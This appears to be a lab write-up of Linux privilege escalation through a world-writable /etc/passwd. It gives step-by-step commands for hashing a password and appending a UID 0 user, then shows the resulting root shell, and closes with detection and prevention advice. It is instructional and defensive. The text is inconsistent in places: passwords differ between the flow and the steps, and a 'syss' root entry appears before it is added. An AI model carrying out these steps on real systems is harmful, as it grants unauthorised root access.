# Misconfigured File Permissions — /etc/passwd

**Date:** July 2026 <br>
**Author:** ShahinSecLab <br>
**Category:** Privilege Escalation <br>
**Difficulty:** Easy <br>
**Tools:** SSH, openssl, nano, su 

## Table of Contents

* [Introduction](#introduction)
* [Attack Flow](#attack-flow)
* [Why This Attack Works](#why-this-attack-works)
* [Lab Setup](#lab-setup)
* [Tools Used](#tools-used)
* [Prerequisites](#prerequisites)
* [Step 1 — Connecting to the Target via SSH](#step-1--connecting-to-the-target-via-ssh)
* [Step 2 — Checking `/etc/passwd` Permissions](#step-2--checking-etcpasswd-permissions)
* [Step 3 — Generating a Password Hash and Editing `/etc/passwd`](#step-3--generating-a-password-hash-and-editing-etcpasswd)
* [Step 4 — Logging in as Root with the New User](#step-4--logging-in-as-root-with-the-new-user)
* [How Defenders Can Catch This](#how-defenders-can-catch-this)
* [How to Prevent It](#how-to-prevent-it)
* [References](#references)
* [Lessons Learned](#lessons-learned)

## Introduction

Misconfigured File Permissions is one of the simplest privilege escalation techniques on Linux. If a critical system file like /etc/passwd is writable by normal users, I can add my own root level user directly to it. The next time I switch to that user, Linux gives me a full root shell — no exploit or CVE needed.

## Attack Flow

```
Connected to the target over SSH with low privilege credentials
                        ↓
Checked permissions on /etc/passwd
                        ↓
Found /etc/passwd was world writable (-rw-r--rw-)
                        ↓
Read the contents of /etc/passwd
                        ↓
Generated a password hash on Kali using openssl
                        ↓
Built a new root user line with UID 0 and the generated hash
                        ↓
Opened /etc/passwd with nano and added the new line
                        ↓
Switched to the new user with su syss
                        ↓
Entered the password shahin
                        ↓
Got a full root shell
                        ↓
                whoami → root
```

## Why This Attack Works

On a normal Linux system, `/etc/passwd` is readable by everyone but only writable by root. This file holds basic user account information — usernames, user IDs, group IDs, home directories, and shell paths.
The password field in `/etc/passwd` normally contains an `x` — which tells Linux to look at 
`/etc/shadow` for the real password hash. But if I replace that `x` with an actual password hash I generate myself, Linux will use my hash directly — completely skipping `/etc/shadow`.
Since I can write to the file, I can add a brand new user with UID 0 (root level) and a password I control. When I switch to that user, Linux sees UID 0 and gives me a full root shell.

## Lab Setup

| Component        | Details                                  |
|------------------|------------------------------------------|
| Attacker Machine | Kali Linux                               |
| Victim Machine   | Debian Linux                             |
| Victim IP        | 192.168.5.133                            |
| Access Method    | SSH with valid low-privilege credentials |
| Network          | VMware Host-Only Network                 |

## Tools Used

| Tool | Purpose |
|------|---------|
| `SSH` | Used to remotely access the target Linux machine |
| `OpenSSL` | Used to generate a password hash for the new user account |
| `Nano` | Used to modify the `/etc/passwd` file |

## Prerequisites

| What | Why |
|------|-----|
| SSH credentials for a low-privilege user | Required to gain initial access to the target Linux machine |
| Write permission on `/etc/passwd` | The misconfiguration that allows modification of user account entries |
| OpenSSL installed on Kali Linux | Used to generate a password hash for the new user |
| Text editor access (nano/vim) on the target | Required to modify `/etc/passwd` and add the crafted user entry |
| Knowledge of Linux user structure (`/etc/passwd` fields and UID) | Required to create a valid root-level user entry |

## Step 1 — Connecting to the Target via SSH

Since the target was running an older SSH setup, I had to add extra flags to allow older key exchange algorithms:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.5.133
```
**Flag Breakdown**

| Flag | Description |
|------|-------------|
| `-o HostKeyAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA host key algorithm, which is required by some older Linux systems |
| `-o PubkeyAcceptedAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA public key algorithm for authentication |
| `user@192.168.5.133` | Connects to the target machine as the `user` account at `192.168.5.133` |

**Output:**

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
user@192.168.5.133's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun 30 12:32:04 2026 from 192.168.5.128
```
It prompted for the password right after the connection request, I typed `password321`, and got logged in successfully. The kernel version 2.6.32 stood out right away.

I logged in as `user`, a normal low privilege account on the system.

<p align="center">
  <img src="images/step1-1.png" width="600">
</p>

## Step 2 — Checking `/etc/passwd` Permissions

```bash
user@debian:~$ ls -la /etc/passwd
```
**Output:**

```
-rw-r--rw- 1 root root 1074 Jan 14 11:17 /etc/passwd
```
**Breakdown**

| Permission | Who            | What it means               |
|------------|----------------|-----------------------------|
|   `rw- `     | Owner (root)   | Root can read and write     |
|   `r--`      | Group (root)   | Group members can only read |
|   `rw-`      | Others         | Everyone can read and write |

The last `rw-` permission was the issue. Normally, only root should have write access to `/etc/passwd`. Because this file was writable by other users, I was able to modify the user account information.

### Read the Current Contents

```bash
user@debian:~$ cat /etc/passwd
```
**Output:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
syss:$1$n1dAk/CX$ZUkgI8Q8i9wC6eh9LlWy/1:0:0:root:/root:/bin/bash
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
statd:x:103:65534::/var/lib/nfs:/bin/false
mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
```
I checked the root account entry:

```
root:x:0:0:root:/root:/bin/bash
```
**What the Root Line Means**

| Field | Value | Description |
|-------|-------|--------------------------------------------------|
| Username | `root` | Account username |
| Password | `x` | Password hash is stored in `/etc/shadow` |
| UID | `0` | User ID 0 represents root privileges |
| GID | `0` | Group ID 0 represents the root group |
| Description | `root` | User information field |
| Home Directory | `/root` | Root user's home directory |
| Shell | `/bin/bash` | Default login shell |

The `x` in the password field means Linux checks `/etc/shadow` for the actual password hash. Since `/etc/passwd` was writable, I could replace this field with a custom hash and create a user with UID `0`.

<p align="center">
  <img src="images/step2-1.png" width="600">
</p>

## Step 3 — Generating a Password Hash and Editing /etc/passwd

### Generated a Password Hash on Kali

I generated a password hash using OpenSSL on the Kali machine.

```bash
openssl passwd "password100"
```
**Flag Breakdown**

| Flag | Description |
|------|---------|
| `openssl` | OpenSSL command-line utility used for cryptographic operations |
| `passwd` | OpenSSL subcommand used to generate a password hash |
| `"password100"` | The plaintext password that will be converted into a password hash |

**Output:**

```
$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0
```
This is the MD5 password hash for the password `password100`.
The generated hash will be used as the password field for the new user entry in `/etc/passwd`.

### Created the New User Entry

I opened mousepad on Kali and I created a new user entry by replacing the password field with the generated hash and setting the UID and GID to 0.

New entry:
```
syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
```
Original root entry:
```
root:x:0:0:root:/root:/bin/bash
```
**Breakdown**

| Field | Value | Description |
|-------|-------|--------------------------------------------------|
| Username | `syss` | Name of the new user |
| Password | `$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0` | Password hash generated using OpenSSL |
| UID | `0` | User ID 0 gives root-level privileges |
| GID | `0` | Group ID 0 belongs to the root group |
| Description | `root` | User description field |
| Home Directory | `/root` | User home directory |
| Shell | `/bin/bash` | Login shell for the user |

### Added the New Entry to `/etc/passwd`

I opened `/etc/passwd` using nano on the target machine and added the new user entry.

```bash
user@debian:~$ nano /etc/passwd
```
I scrolled to the bottom of the file and pasted the line:

```
syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
```
Saved the file by pressing:

```
Ctrl + X → Y → Enter
```

### Verified the New User Entry

I checked /etc/passwd to confirm that the new user was added successfully.

```bash
user@debian:~$ cat /etc/passwd
```
**Output:**

```
root:x:0:0:root:/root:/bin/bash
...
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
...
mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
```
The new user syss was added successfully with UID 0, which means it has root-level privileges.

<p align="center">
  <img src="images/step3-1.png" width="600">
</p>

## Step 4 — Logging in as Root with the New User

I switched to the newly created user using `su`.

```bash
user@debian:~$ su syss
```
Entered the password:

```bash
Password: password100
```
**Output:**

```
root@debian:/home/user#
```
The shell changed to `root`, which indicates that the user `syss` has root-level privileges.

### Confirmed Root Access

I verified the current user:

```bash
root@debian:/home/user# whoami
```
**Output:**

```
root
```
I also checked the user ID:

```bash
root@debian:/home/user# id
```
```
uid=0(root) gid=0(root) groups=0(root)
```
The UID 0 confirms that the current user has root privileges.

By modifying `/etc/passwd` and creating a user with UID `0`, a low-privileged user was able to gain full root access due to incorrect file permissions.

<p align="center">
  <img src="images/step4-1.png" width="600">
</p>

## How Defenders Can Catch This

| Indicator | What to look for |
|-----------|------------------|
| Unexpected changes to `/etc/passwd` | Monitor file modifications using file integrity monitoring tools |
| `/etc/passwd` has write permission for normal users | Regularly check critical file permissions |
| New users with UID `0` | Review `/etc/passwd` entries and investigate accounts other than root with UID `0` |
| Unexpected use of `su` to switch users | Monitor authentication logs and PAM activity |
| Changes to system account files | Review logs such as `/var/log/auth.log` for suspicious activity |

## How to Prevent It

**Fix the permissions on /etc/passwd immediately**

```bash
chmod 644 /etc/passwd
```
The correct permission for /etc/passwd is -rw-r--r-- — root can write, everyone else can only read.

**Audit critical file permissions regularly**

```bash
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```
**Use file integrity monitoring**
Tools like AIDE or Tripwire will alert you the moment /etc/passwd is modified outside of normal admin activity.

**Monitor for new UID 0 accounts**
Run this regularly to check for any accounts with root level UID:

```bash
awk -F: '($3 == 0) {print}' /etc/passwd
```
This should only ever return the root account. Any other entry with UID 0 is a red flag.

## References

| Resource | Link |
|----------|------|
| **MITRE ATT&CK — `/etc/passwd` and `/etc/shadow`**   | https://attack.mitre.org/techniques/T1003/008 |
| **HackTricks — Writable `/etc/passwd`** | https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd |
| **PayloadsAllTheThings — `passwd` file** | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#writable-etcpasswd |
| **Linux man page — `passwd`** | https://www.man7.org/linux/man-pages/man5/passwd.5.html |
| **GTFOBins** | https://gtfobins.github.io |

 ## Lessons Learned

- Incorrect file permissions on critical system files can lead to complete system compromise.
- Files like `/etc/passwd` should only be writable by the root user.
- A normal user should never be able to create or modify accounts with UID `0`.
- Regular permission audits can help identify dangerous misconfigurations before they are abused.
- Monitoring changes to system account files can help detect privilege escalation attempts.
- Proper Linux file permission management is an important part of system security.
